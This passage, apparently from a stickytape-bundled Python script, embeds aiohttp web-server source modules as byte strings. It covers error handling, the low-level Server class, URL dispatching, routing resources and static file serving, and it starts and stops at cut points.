return " "statement on request handler")\r\n            else:\r\n                raise RuntimeError(\r\n                    "Web-handler should return "\r\n                    "a response instance, "\r\n                    "got {!r}".format(resp)\r\n                )\r\n        try:\r\n            await prepare_meth(request)\r\n            await resp.write_eof()\r\n        except ConnectionError:\r\n            self.log_access(request, resp, start_time)\r\n            return True\r\n        else:\r\n            self.log_access(request, resp, start_time)\r\n            return False\r\n\r\n    def handle_error(\r\n        self,\r\n        request: BaseRequest,\r\n        status: int = 500,\r\n        exc: Optional[BaseException] = None,\r\n        message: Optional[str] = None,\r\n    ) -> StreamResponse:\r\n        """Handle errors.\r\n\r\n        Returns HTTP response with specific status code. Logs additional\r\n        information. It always closes current connection.\r\n        """\r\n        self.log_exception("Error handling request", exc_info=exc)\r\n\r\n        # some data already got sent, connection is broken\r\n        if request.writer.output_size > 0:\r\n            raise ConnectionError(\r\n                "Response is sent already, cannot send another response "\r\n                "with the error message"\r\n            )\r\n\r\n        ct = "text/plain"\r\n        if status == HTTPStatus.INTERNAL_SERVER_ERROR:\r\n            title = "{0.value} {0.phrase}".format(HTTPStatus.INTERNAL_SERVER_ERROR)\r\n            msg = HTTPStatus.INTERNAL_SERVER_ERROR.description\r\n            tb = None\r\n            if self.debug:\r\n                with suppress(Exception):\r\n                    tb = traceback.format_exc()\r\n\r\n            if "text/html" in request.headers.get("Accept", ""):\r\n                if tb:\r\n                    tb = html_escape(tb)\r\n                    msg = f"<h2>Traceback:</h2>\\n<pre>{tb}</pre>"\r\n                message = (\r\n                    "<html><head>"\r\n                    "<title>{title}</title>"\r\n                    "</head><body>\\n<h1>{title}</h1>"\r\n                    "\\n{msg}\\n</body></html>\\n"\r\n                ).format(title=title, msg=msg)\r\n                ct = "text/html"\r\n            else:\r\n                if tb:\r\n                    msg = tb\r\n                message = title + "\\n\\n" + msg\r\n\r\n        resp = Response(status=status, text=message, content_type=ct)\r\n        resp.force_close()\r\n\r\n        return resp\r\n\r\n    def _make_error_handler(\r\n        self, err_info: _ErrInfo\r\n    ) -> Callable[[BaseRequest], Awaitable[StreamResponse]]:\r\n        async def handler(request: BaseRequest) -> StreamResponse:\r\n            return self.handle_error(\r\n                request, err_info.status, err_info.exc, err_info.message\r\n            )\r\n\r\n        return handler\r\n')
    __stickytape_write_module('aiohttp/web_server.py', b'"""Low level HTTP server."""\r\nimport asyncio\r\nfrom typing import Any, Awaitable, Callable, Dict, List, Optional  # noqa\r\n\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import get_running_loop\r\nfrom .http_parser import RawRequestMessage\r\nfrom .streams import StreamReader\r\nfrom .web_protocol import RequestHandler, _RequestFactory, _RequestHandler\r\nfrom .web_request import BaseRequest\r\n\r\n__all__ = ("Server",)\r\n\r\n\r\nclass Server:\r\n    def __init__(\r\n        self,\r\n        handler: _RequestHandler,\r\n        *,\r\n        request_factory: Optional[_RequestFactory] = None,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        **kwargs: Any\r\n    ) -> None:\r\n        self._loop = get_running_loop(loop)\r\n        self._connections = {}  # type: Dict[RequestHandler, asyncio.Transport]\r\n        self._kwargs = kwargs\r\n        self.requests_count = 0\r\n        self.request_handler = handler\r\n        self.request_factory = request_factory or self._make_request\r\n\r\n    @property\r\n    def connections(self) -> List[RequestHandler]:\r\n        return list(self._connections.keys())\r\n\r\n    def connection_made(\r\n        self, handler: RequestHandler, transport: asyncio.Transport\r\n    ) -> None:\r\n        self._connections[handler] = transport\r\n\r\n    def connection_lost(\r\n        self, handler: RequestHandler, exc: Optional[BaseException] = None\r\n    ) -> None:\r\n        if handler in self._connections:\r\n            del self._connections[handler]\r\n\r\n    def _make_request(\r\n        self,\r\n        message: RawRequestMessage,\r\n        payload: StreamReader,\r\n        protocol: RequestHandler,\r\n        writer: AbstractStreamWriter,\r\n        task: "asyncio.Task[None]",\r\n    ) -> BaseRequest:\r\n        return BaseRequest(message, payload, protocol, writer, task, self._loop)\r\n\r\n    async def shutdown(self, timeout: Optional[float] = None) -> None:\r\n        coros = [conn.shutdown(timeout) for conn in self._connections]\r\n        await asyncio.gather(*coros)\r\n        self._connections.clear()\r\n\r\n    def __call__(self) -> RequestHandler:\r\n        return RequestHandler(self, loop=self._loop, **self._kwargs)\r\n')
    __stickytape_write_module('aiohttp/web_urldispatcher.py', b'import abc\r\nimport asyncio\r\nimport base64\r\nimport hashlib\r\nimport inspect\r\nimport keyword\r\nimport os\r\nimport re\r\nimport warnings\r\nfrom contextlib import contextmanager\r\nfrom functools import wraps\r\nfrom pathlib import Path\r\nfrom types import MappingProxyType\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Container,\r\n    Dict,\r\n    Generator,\r\n    Iterable,\r\n    Iterator,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Pattern,\r\n    Set,\r\n    Sized,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom yarl import URL, __version__ as yarl_version  # type: ignore[attr-defined]\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractMatchInfo, AbstractRouter, AbstractView\r\nfrom .helpers import DEBUG\r\nfrom .http import HttpVersion11\r\nfrom .typedefs import Final, Handler, PathLike, TypedDict\r\nfrom .web_exceptions import (\r\n    HTTPException,\r\n    HTTPExpectationFailed,\r\n    HTTPForbidden,\r\n    HTTPMethodNotAllowed,\r\n    HTTPNotFound,\r\n)\r\nfrom .web_fileresponse import FileResponse\r\nfrom .web_request import Request\r\nfrom .web_response import Response, StreamResponse\r\nfrom .web_routedef import AbstractRouteDef\r\n\r\n__all__ = (\r\n    "UrlDispatcher",\r\n    "UrlMappingMatchInfo",\r\n    "AbstractResource",\r\n    "Resource",\r\n    "PlainResource",\r\n    "DynamicResource",\r\n    "AbstractRoute",\r\n    "ResourceRoute",\r\n    "StaticResource",\r\n    "View",\r\n)\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_app import Application\r\n\r\n    BaseDict = Dict[str, str]\r\nelse:\r\n    BaseDict = dict\r\n\r\nYARL_VERSION: Final[Tuple[int, ...]] = tuple(map(int, yarl_version.split(".")[:2]))\r\n\r\nHTTP_METHOD_RE: Final[Pattern[str]] = re.compile(\r\n    r"^[0-9A-Za-z!#\\$%&\'\\*\\+\\-\\.\\^_`\\|~]+$"\r\n)\r\nROUTE_RE: Final[Pattern[str]] = re.compile(\r\n    r"(\\{[_a-zA-Z][^{}]*(?:\\{[^{}]*\\}[^{}]*)*\\})"\r\n)\r\nPATH_SEP: Final[str] = re.escape("/")\r\n\r\n\r\n_ExpectHandler = Callable[[Request], Awaitable[None]]\r\n_Resolve = Tuple[Optional["UrlMappingMatchInfo"], Set[str]]\r\n\r\n\r\nclass _InfoDict(TypedDict, total=False):\r\n    path: str\r\n\r\n    formatter: str\r\n    pattern: Pattern[str]\r\n\r\n    directory: Path\r\n    prefix: str\r\n    routes: Mapping[str, "AbstractRoute"]\r\n\r\n    app: "Application"\r\n\r\n    domain: str\r\n\r\n    rule: "AbstractRuleMatching"\r\n\r\n    http_exception: HTTPException\r\n\r\n\r\nclass AbstractResource(Sized, Iterable["AbstractRoute"]):\r\n    def __init__(self, *, name: Optional[str] = None) -> None:\r\n        self._name = name\r\n\r\n    @property\r\n    def name(self) -> Optional[str]:\r\n        return self._name\r\n\r\n    @property\r\n    @abc.abstractmethod\r\n    def canonical(self) -> str:\r\n        """Exposes the resource\'s canonical path.\r\n\r\n        For example \'/foo/bar/{name}\'\r\n\r\n        """\r\n\r\n    @abc.abstractmethod  # pragma: no branch\r\n    def url_for(self, **kwargs: str) -> URL:\r\n        """Construct url for resource with additional params."""\r\n\r\n    @abc.abstractmethod  # pragma: no branch\r\n    async def resolve(self, request: Request) -> _Resolve:\r\n        """Resolve resource.\r\n\r\n        Return (UrlMappingMatchInfo, allowed_methods) pair.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def add_prefix(self, prefix: str) -> None:\r\n        """Add a prefix to processed URLs.\r\n\r\n        Required for subapplications support.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def get_info(self) -> _InfoDict:\r\n        """Return a dict with additional info useful for introspection"""\r\n\r\n    def freeze(self) -> None:\r\n        pass\r\n\r\n    @abc.abstractmethod\r\n    def raw_match(self, path: str) -> bool:\r\n        """Perform a raw match against path"""\r\n\r\n\r\nclass AbstractRoute(abc.ABC):\r\n    def __init__(\r\n        self,\r\n        method: str,\r\n        handler: Union[Handler, Type[AbstractView]],\r\n        *,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n        resource: Optional[AbstractResource] = None,\r\n    ) -> None:\r\n\r\n        if expect_handler is None:\r\n            expect_handler = _default_expect_handler\r\n\r\n        assert asyncio.iscoroutinefunction(\r\n            expect_handler\r\n        ), f"Coroutine is expected, got {expect_handler!r}"\r\n\r\n        method = method.upper()\r\n        if not HTTP_METHOD_RE.match(method):\r\n            raise ValueError(f"{method} is not allowed HTTP method")\r\n\r\n        assert callable(handler), handler\r\n        if asyncio.iscoroutinefunction(handler):\r\n            pass\r\n        elif inspect.isgeneratorfunction(handler):\r\n            warnings.warn(\r\n                "Bare generators are deprecated, " "use @coroutine wrapper",\r\n                DeprecationWarning,\r\n            )\r\n        elif isinstance(handler, type) and issubclass(handler, AbstractView):\r\n            pass\r\n        else:\r\n            warnings.warn(\r\n                "Bare functions are deprecated, " "use async ones", DeprecationWarning\r\n            )\r\n\r\n            @wraps(handler)\r\n            async def handler_wrapper(request: Request) -> StreamResponse:\r\n                result = old_handler(request)\r\n                if asyncio.iscoroutine(result):\r\n                    return await result\r\n                return result  # type: ignore[return-value]\r\n\r\n            old_handler = handler\r\n            handler = handler_wrapper\r\n\r\n        self._method = method\r\n        self._handler = handler\r\n        self._expect_handler = expect_handler\r\n        self._resource = resource\r\n\r\n    @property\r\n    def method(self) -> str:\r\n        return self._method\r\n\r\n    @property\r\n    def handler(self) -> Handler:\r\n        return self._handler\r\n\r\n    @property\r\n    @abc.abstractmethod\r\n    def name(self) -> Optional[str]:\r\n        """Optional route\'s name, always equals to resource\'s name."""\r\n\r\n    @property\r\n    def resource(self) -> Optional[AbstractResource]:\r\n        return self._resource\r\n\r\n    @abc.abstractmethod\r\n    def get_info(self) -> _InfoDict:\r\n        """Return a dict with additional info useful for introspection"""\r\n\r\n    @abc.abstractmethod  # pragma: no branch\r\n    def url_for(self, *args: str, **kwargs: str) -> URL:\r\n        """Construct url for route with additional params."""\r\n\r\n    async def handle_expect_header(self, request: Request) -> None:\r\n        await self._expect_handler(request)\r\n\r\n\r\nclass UrlMappingMatchInfo(BaseDict, AbstractMatchInfo):\r\n    def __init__(self, match_dict: Dict[str, str], route: AbstractRoute):\r\n        super().__init__(match_dict)\r\n        self._route = route\r\n        self._apps = []  # type: List[Application]\r\n        self._current_app = None  # type: Optional[Application]\r\n        self._frozen = False\r\n\r\n    @property\r\n    def handler(self) -> Handler:\r\n        return self._route.handler\r\n\r\n    @property\r\n    def route(self) -> AbstractRoute:\r\n        return self._route\r\n\r\n    @property\r\n    def expect_handler(self) -> _ExpectHandler:\r\n        return self._route.handle_expect_header\r\n\r\n    @property\r\n    def http_exception(self) -> Optional[HTTPException]:\r\n        return None\r\n\r\n    def get_info(self) -> _InfoDict:  # type: ignore[override]\r\n        return self._route.get_info()\r\n\r\n    @property\r\n    def apps(self) -> Tuple["Application", ...]:\r\n        return tuple(self._apps)\r\n\r\n    def add_app(self, app: "Application") -> None:\r\n        if self._frozen:\r\n            raise RuntimeError("Cannot change apps stack after .freeze() call")\r\n        if self._current_app is None:\r\n            self._current_app = app\r\n        self._apps.insert(0, app)\r\n\r\n    @property\r\n    def current_app(self) -> "Application":\r\n        app = self._current_app\r\n        assert app is not None\r\n        return app\r\n\r\n    @contextmanager\r\n    def set_current_app(self, app: "Application") -> Generator[None, None, None]:\r\n        if DEBUG:  # pragma: no cover\r\n            if app not in self._apps:\r\n                raise RuntimeError(\r\n                    "Expected one of the following apps {!r}, got {!r}".format(\r\n                        self._apps, app\r\n                    )\r\n                )\r\n        prev = self._current_app\r\n        self._current_app = app\r\n        try:\r\n            yield\r\n        finally:\r\n            self._current_app = prev\r\n\r\n    def freeze(self) -> None:\r\n        self._frozen = True\r\n\r\n    def __repr__(self) -> str:\r\n        return f"<MatchInfo {super().__repr__()}: {self._route}>"\r\n\r\n\r\nclass MatchInfoError(UrlMappingMatchInfo):\r\n    def __init__(self, http_exception: HTTPException) -> None:\r\n        self._exception = http_exception\r\n        super().__init__({}, SystemRoute(self._exception))\r\n\r\n    @property\r\n    def http_exception(self) -> HTTPException:\r\n        return self._exception\r\n\r\n    def __repr__(self) -> str:\r\n        return "<MatchInfoError {}: {}>".format(\r\n            self._exception.status, self._exception.reason\r\n        )\r\n\r\n\r\nasync def _default_expect_handler(request: Request) -> None:\r\n    """Default handler for Expect header.\r\n\r\n    Just send "100 Continue" to client.\r\n    raise HTTPExpectationFailed if value of header is not "100-continue"\r\n    """\r\n    expect = request.headers.get(hdrs.EXPECT, "")\r\n    if request.version == HttpVersion11:\r\n        if expect.lower() == "100-continue":\r\n            await request.writer.write(b"HTTP/1.1 100 Continue\\r\\n\\r\\n")\r\n        else:\r\n            raise HTTPExpectationFailed(text="Unknown Expect: %s" % expect)\r\n\r\n\r\nclass Resource(AbstractResource):\r\n    def __init__(self, *, name: Optional[str] = None) -> None:\r\n        super().__init__(name=name)\r\n        self._routes = []  # type: List[ResourceRoute]\r\n\r\n    def add_route(\r\n        self,\r\n        method: str,\r\n        handler: Union[Type[AbstractView], Handler],\r\n        *,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n    ) -> "ResourceRoute":\r\n\r\n        for route_obj in self._routes:\r\n            if route_obj.method == method or route_obj.method == hdrs.METH_ANY:\r\n                raise RuntimeError(\r\n                    "Added route will never be executed, "\r\n                    "method {route.method} is already "\r\n                    "registered".format(route=route_obj)\r\n                )\r\n\r\n        route_obj = ResourceRoute(method, handler, self, expect_handler=expect_handler)\r\n        self.register_route(route_obj)\r\n        return route_obj\r\n\r\n    def register_route(self, route: "ResourceRoute") -> None:\r\n        assert isinstance(\r\n            route, ResourceRoute\r\n        ), f"Instance of Route class is required, got {route!r}"\r\n        self._routes.append(route)\r\n\r\n    async def resolve(self, request: Request) -> _Resolve:\r\n        allowed_methods = set()  # type: Set[str]\r\n\r\n        match_dict = self._match(request.rel_url.raw_path)\r\n        if match_dict is None:\r\n            return None, allowed_methods\r\n\r\n        for route_obj in self._routes:\r\n            route_method = route_obj.method\r\n            allowed_methods.add(route_method)\r\n\r\n            if route_method == request.method or route_method == hdrs.METH_ANY:\r\n                return (UrlMappingMatchInfo(match_dict, route_obj), allowed_methods)\r\n        else:\r\n            return None, allowed_methods\r\n\r\n    @abc.abstractmethod\r\n    def _match(self, path: str) -> Optional[Dict[str, str]]:\r\n        pass  # pragma: no cover\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._routes)\r\n\r\n    def __iter__(self) -> Iterator[AbstractRoute]:\r\n        return iter(self._routes)\r\n\r\n    # TODO: implement all abstract methods\r\n\r\n\r\nclass PlainResource(Resource):\r\n    def __init__(self, path: str, *, name: Optional[str] = None) -> None:\r\n        super().__init__(name=name)\r\n        assert not path or path.startswith("/")\r\n        self._path = path\r\n\r\n    @property\r\n    def canonical(self) -> str:\r\n        return self._path\r\n\r\n    def freeze(self) -> None:\r\n        if not self._path:\r\n            self._path = "/"\r\n\r\n    def add_prefix(self, prefix: str) -> None:\r\n        assert prefix.startswith("/")\r\n        assert not prefix.endswith("/")\r\n        assert len(prefix) > 1\r\n        self._path = prefix + self._path\r\n\r\n    def _match(self, path: str) -> Optional[Dict[str, str]]:\r\n        # string comparison is about 10 times faster than regexp matching\r\n        if self._path == path:\r\n            return {}\r\n        else:\r\n            return None\r\n\r\n    def raw_match(self, path: str) -> bool:\r\n        return self._path == path\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"path": self._path}\r\n\r\n    def url_for(self) -> URL:  # type: ignore[override]\r\n        return URL.build(path=self._path, encoded=True)\r\n\r\n    def __repr__(self) -> str:\r\n        name = "\'" + self.name + "\' " if self.name is not None else ""\r\n        return f"<PlainResource {name} {self._path}>"\r\n\r\n\r\nclass DynamicResource(Resource):\r\n\r\n    DYN = re.compile(r"\\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*)\\}")\r\n    DYN_WITH_RE = re.compile(r"\\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*):(?P<re>.+)\\}")\r\n    GOOD = r"[^{}/]+"\r\n\r\n    def __init__(self, path: str, *, name: Optional[str] = None) -> None:\r\n        super().__init__(name=name)\r\n        pattern = ""\r\n        formatter = ""\r\n        for part in ROUTE_RE.split(path):\r\n            match = self.DYN.fullmatch(part)\r\n            if match:\r\n                pattern += "(?P<{}>{})".format(match.group("var"), self.GOOD)\r\n                formatter += "{" + match.group("var") + "}"\r\n                continue\r\n\r\n            match = self.DYN_WITH_RE.fullmatch(part)\r\n            if match:\r\n                pattern += "(?P<{var}>{re})".format(**match.groupdict())\r\n                formatter += "{" + match.group("var") + "}"\r\n                continue\r\n\r\n            if "{" in part or "}" in part:\r\n                raise ValueError(f"Invalid path \'{path}\'[\'{part}\']")\r\n\r\n            part = _requote_path(part)\r\n            formatter += part\r\n            pattern += re.escape(part)\r\n\r\n        try:\r\n            compiled = re.compile(pattern)\r\n        except re.error as exc:\r\n            raise ValueError(f"Bad pattern \'{pattern}\': {exc}") from None\r\n        assert compiled.pattern.startswith(PATH_SEP)\r\n        assert formatter.startswith("/")\r\n        self._pattern = compiled\r\n        self._formatter = formatter\r\n\r\n    @property\r\n    def canonical(self) -> str:\r\n        return self._formatter\r\n\r\n    def add_prefix(self, prefix: str) -> None:\r\n        assert prefix.startswith("/")\r\n        assert not prefix.endswith("/")\r\n        assert len(prefix) > 1\r\n        self._pattern = re.compile(re.escape(prefix) + self._pattern.pattern)\r\n        self._formatter = prefix + self._formatter\r\n\r\n    def _match(self, path: str) -> Optional[Dict[str, str]]:\r\n        match = self._pattern.fullmatch(path)\r\n        if match is None:\r\n            return None\r\n        else:\r\n            return {\r\n                key: _unquote_path(value) for key, value in match.groupdict().items()\r\n            }\r\n\r\n    def raw_match(self, path: str) -> bool:\r\n        return self._formatter == path\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"formatter": self._formatter, "pattern": self._pattern}\r\n\r\n    def url_for(self, **parts: str) -> URL:\r\n        url = self._formatter.format_map({k: _quote_path(v) for k, v in parts.items()})\r\n        return URL.build(path=url, encoded=True)\r\n\r\n    def __repr__(self) -> str:\r\n        name = "\'" + self.name + "\' " if self.name is not None else ""\r\n        return "<DynamicResource {name} {formatter}>".format(\r\n            name=name, formatter=self._formatter\r\n        )\r\n\r\n\r\nclass PrefixResource(AbstractResource):\r\n    def __init__(self, prefix: str, *, name: Optional[str] = None) -> None:\r\n        assert not prefix or prefix.startswith("/"), prefix\r\n        assert prefix in ("", "/") or not prefix.endswith("/"), prefix\r\n        super().__init__(name=name)\r\n        self._prefix = _requote_path(prefix)\r\n        self._prefix2 = self._prefix + "/"\r\n\r\n    @property\r\n    def canonical(self) -> str:\r\n        return self._prefix\r\n\r\n    def add_prefix(self, prefix: str) -> None:\r\n        assert prefix.startswith("/")\r\n        assert not prefix.endswith("/")\r\n        assert len(prefix) > 1\r\n        self._prefix = prefix + self._prefix\r\n        self._prefix2 = self._prefix + "/"\r\n\r\n    def raw_match(self, prefix: str) -> bool:\r\n        return False\r\n\r\n    # TODO: impl missing abstract methods\r\n\r\n\r\nclass StaticResource(PrefixResource):\r\n    VERSION_KEY = "v"\r\n\r\n    def __init__(\r\n        self,\r\n        prefix: str,\r\n        directory: PathLike,\r\n        *,\r\n        name: Optional[str] = None,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n        chunk_size: int = 256 * 1024,\r\n        show_index: bool = False,\r\n        follow_symlinks: bool = False,\r\n        append_version: bool = False,\r\n    ) -> None:\r\n        super().__init__(prefix, name=name)\r\n        try:\r\n            directory = Path(directory)\r\n            if str(directory).startswith("~"):\r\n                directory = Path(os.path.expanduser(str(directory)))\r\n            directory = directory.resolve()\r\n            if not directory.is_dir():\r\n                raise ValueError("Not a directory")\r\n        except (FileNotFoundError, ValueError) as error:\r\n            raise ValueError(f"No directory exists at \'{directory}\'") from error\r\n        self._directory = directory\r\n        self._show_index = show_index\r\n        self._chunk_size = chunk_size\r\n        self._follow_symlinks = follow_symlinks\r\n        self._expect_handler = expect_handler\r\n        self._append_version = append_version\r\n\r\n        self._routes = {\r\n            "GET": ResourceRoute(\r\n                "GET", self._handle, self, expect_handler=expect_handler\r\n            ),\r\n            "HEAD": ResourceRoute(\r\n                "HEAD", self._handle, self, expect_handler=expect_handler\r\n            ),\r\n        }\r\n\r\n    def url_for(  # type: ignore[override]\r\n        self,\r\n        *,\r\n        filename: Union[str, Path],\r\n        append_version: Optional[bool] = None,\r\n    ) -> URL:\r\n        if append_version is None:\r\n            append_version = self._append_version\r\n        if isinstance(filename, Path):\r\n            filename = str(filename)\r\n        filename = filename.lstrip("/")\r\n\r\n        url = URL.build(path=self._prefix, encoded=True)\r\n        # filename is not encoded\r\n        if YARL_VERSION < (1, 6):\r\n            url = url / filename.replace("%", "%25")\r\n        else:\r\n            url = url / filename\r\n\r\n        if append_version:\r\n            try:\r\n                filepath = self._directory.joinpath(filename).resolve()\r\n                if not self._follow_symlinks:\r\n                    filepath.relative_to(self._directory)\r\n            except (ValueError, FileNotFoundError):\r\n                # ValueError for case when path point to symlink\r\n                # with follow_symlinks is False\r\n                return url  # relatively safe\r\n            if filepath.is_file():\r\n                # TODO cache file content\r\n                # with file watcher for cache invalidation\r\n                with filepath.open("rb") as f:\r\n                    file_bytes = f.read()\r\n                h = self._get_file_hash(file_bytes)\r\n                url = url.with_query({self.VERSION_KEY: h})\r\n                return url\r\n        return url\r\n\r\n    @staticmethod\r\n    def _get_file_hash(byte_array: bytes) -> str:\r\n        m = hashlib.sha256()  # todo sha256 can be configurable param\r\n        m.update(byte_array)\r\n        b64 = base64.urlsafe_b64encode(m.digest())\r\n        return b64.decode("ascii")\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {\r\n            "directory": self._directory,\r\n            "prefix": self._prefix,\r\n            "routes": self._routes,\r\n        }\r\n\r\n    def set_options_route(self, handler: Handler) -> None:\r\n        if "OPTIONS" in self._routes:\r\n            raise RuntimeError("OPTIONS route was set already")\r\n        self._routes["OPTIONS"] = ResourceRoute(\r\n            "OPTIONS", handler, self, expect_handler=self._expect_handler\r\n        )\r\n\r\n    async def resolve(self, request: Request) -> _Resolve:\r\n        path = request.rel_url.raw_path\r\n        method = request.method\r\n        allowed_methods = set(self._routes)\r\n        if not path.startswith(self._prefix2) and path != self._prefix:\r\n            return None, set()\r\n\r\n        if method not in allowed_methods:\r\n            return None, allowed_methods\r\n\r\n        match_dict = {"filename": _unquote_path(path[len(self._prefix) + 1 :])}\r\n        return (UrlMappingMatchInfo(match_dict, self._routes[method]), allowed_methods)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._routes)\r\n\r\n    def __iter__(self) -> Iterator[AbstractRoute]:\r\n        return iter(self._routes.values())\r\n\r\n    async def _handle(self, request: Request) -> StreamResponse:\r\n        rel_url = request.match_info["filename"]\r\n        try:\r\n            filename = Path(rel_url)\r\n            if filename.anchor:\r\n                # rel_url is an absolute name like\r\n                # /static/\\\\machine_name\\c$ or /static/D:\\path\r\n                # where the static dir is totally different\r\n                raise HTTPForbidden()\r\n            filepath = self._directory.joinpath(filename).resolve()\r\n            if not self._follow_symlinks:\r\n                filepath.relative_to(self._directory)\r\n        except (ValueError, FileNotFoundError) as error:\r\n            # relatively safe\r\n            raise HTTPNotFound() from error\r\n        except HTTPForbidden:\r\n            raise\r\n        except Exception as error:\r\n            # perm error or other kind!\r\n            request.app.logger.exception(error)\r\n            raise HTTPNotFound() from error\r\n\r\n        # on opening a dir, load its contents if allowed\r\n        if filepath.is_dir():\r\n            if self._show_index:\r\n                try:\r\n                    return Response(\r\n                        text=self._directory_as_html(filepath), content_type="text/html"\r\n                    )\r\n                except PermissionError:\r\n                    raise HTTPForbidden()\r\n            else:\r\n                raise HTTPForbidden()\r\n        elif filepath.is_file():\r\n            return FileResponse(filepath, chunk_size=self._chunk_size)\r\n        else:\r\n            raise HTTPNotFound\r\n\r\n    def _directory_as_html(self, filepath: Path) -> str:\r\n        # returns directory\'s index as html\r\n\r\n        # sanity check\r\n        assert filepath.is_dir()\r\n\r\n        relative_path_to_dir = filepath.relative_to(self._directory).as_posix()\r\n        index_of = f"Index of /{relative_path_to_dir}"\r\n        h1 = f"<h1>{index_of}</h1>"\r\n\r\n        index_list = []\r\n        dir_index = filepath.iterdir()\r\n        for _file in sorted(dir_index):\r\n            # show file url as relative to static path\r\n            rel_path = _file.relative_to(self._directory).as_posix()\r\n            file_url = self._prefix + "/" + rel_path\r\n\r\n            # if file is a directory, add \'/\' to the end of the name\r\n            if _file.is_dir():\r\n                file_name = f"{_file.name}/"\r\n            else:\r\n                file_name = _file.name\r\n\r\n            index_list.append(\r\n                \'<li><a href="{url}">{name}</a></li>\'.format(\r\n                    url=file_url, name=file_name\r\n                )\r\n            )\r\n        ul = "<ul>\\n{}\\n</ul>".format("\\n".join(index_list))\r\n        body = f"<body>\\n{h1}\\n{ul}\\n</body>"\r\n\r\n        head_str = f"<head>\\n<title>{index_of}</title>\\n</head>"\r\n        html = f"<html>\\n{head_str}\\n{body}\\n</html>"\r\n\r\n        return html\r\n\r\n    def __repr__(self) -> str:\r\n        name = "\'" + self.name + "\'" if self.name is not None else ""\r\n        return "<StaticResource {name} {path} -> {directory!r}>".format(\r\n            name=name, path=self._prefix, directory=self._directory\r\n        )\r\n\r\n\r\nclass PrefixedSubAppResource(PrefixResource):\r\n    def __init__(self, prefix: str, app: "Application") -> None:\r\n        super().__init__(prefix)\r\n        self._app = app\r\n        for resource in app.router.resources():\r\n            resource.add_prefix(prefix)\r\n\r\n    def add_prefix(self, prefix: str) -> None:\r\n        super().add_prefix(prefix)\r\n        for resource in self._app.router.resources():\r\n            resource.add_prefix(prefix)\r\n\r\n    def url_for(self, *args: str, **kwargs: str) -> URL:\r\n        raise RuntimeError(".url_for() is not supported " "by sub-application root")\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"app": self._app, "prefix": self._prefix}\r\n\r\n    async def resolve(self, request: Request) -> _Resolve:\r\n        if (\r\n            not request.url.raw_path.startswith(self._prefix2)\r\n            and request.url.raw_path != self._prefix\r\n        ):\r\n            return None, set()\r\n        match_info = await self._app.router.resolve(request)\r\n        match_info.add_app(self._app)\r\n        if isinstance(match_info.http_exception, HTTPMethodNotAllowed):\r\n            methods = match_info.http_exception.allowed_methods\r\n        else:\r\n            methods = set()\r\n        return match_info, methods\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._app.router.routes())\r\n\r\n    def __iter__(self) -> Iterator[AbstractRoute]:\r\n        return iter(self._app.router.routes())\r\n\r\n    def __repr__(self) -> str:\r\n        return "<PrefixedSubAppResource {prefix} -> {app!r}>".format(\r\n            prefix=self._prefix, app=self._app\r\n        )\r\n\r\n\r\nclass AbstractRuleMatching(abc.ABC):\r\n    @abc.abstractmethod  # pragma: no branch\r\n    async def match(self, request: Request) -> bool:\r\n        """Return bool if the request satisfies the criteria"""\r\n\r\n    @abc.abstractmethod  # pragma: no branch\r\n    def get_info(self) -> _InfoDict:\r\n        """Return a dict with additional info useful for introspection"""\r\n\r\n    @property\r\n    @abc.abstractmethod  # pragma: no branch\r\n    def canonical(self) -> str:\r\n        """Return a str"""\r\n\r\n\r\nclass Domain(AbstractRuleMatching):\r\n    re_part = re.compile(r"(?!-)[a-z\\d-]{1,63}(?<!-)")\r\n\r\n    def __init__(self, domain: str) -> None:\r\n        super().__init__()\r\n        self._domain = self.validation(domain)\r\n\r\n    @property\r\n    def canonical(self) -> str:\r\n        return self._domain\r\n\r\n    def validation(self, domain: str) -> str:\r\n        if not isinstance(domain, str):\r\n            raise TypeError("Domain must be str")\r\n        domain = domain.rstrip(".").lower()\r\n        if not domain:\r\n            raise ValueError("Domain cannot be empty")\r\n        elif "://" in domain:\r\n            raise ValueError("Scheme not supported")\r\n        url = URL("http://" + domain)\r\n        assert url.raw_host is not None\r\n        if not all(self.re_part.fullmatch(x) for x in url.raw_host.split(".")):\r\n            raise ValueError("Domain not valid")\r\n        if url.port == 80:\r\n            return url.raw_host\r\n        return f"{url.raw_host}:{url.port}"\r\n\r\n    async def match(self, request: Request) -> bool:\r\n        host = request.headers.get(hdrs.HOST)\r\n        if not host:\r\n            return False\r\n        return self.match_domain(host)\r\n\r\n    def match_domain(self, host: str) -> bool:\r\n        return host.lower() == self._domain\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"domain": self._domain}\r\n\r\n\r\nclass MaskDomain(Domain):\r\n    re_part = re.compile(r"(?!-)[a-z\\d\\*-]{1,63}(?<!-)")\r\n\r\n    def __init__(self, domain: str) -> None:\r\n        super().__init__(domain)\r\n        mask = self._domain.replace(".", r"\\.").replace("*", ".*")\r\n        self._mask = re.compile(mask)\r\n\r\n    @property\r\n    def canonical(self) -> str:\r\n        return self._mask.pattern\r\n\r\n    def match_domain(self, host: str) -> bool:\r\n        return self._mask.fullmatch(host) is not None\r\n\r\n\r\nclass MatchedSubAppResource(PrefixedSubAppResource):\r\n    def __init__(self, rule: AbstractRuleMatching, app: "Application") -> None:\r\n        AbstractResource.__init__(self)\r\n        self._prefix = ""\r\n        self._app = app\r\n        self._rule = rule\r\n\r\n    @property\r\n    def 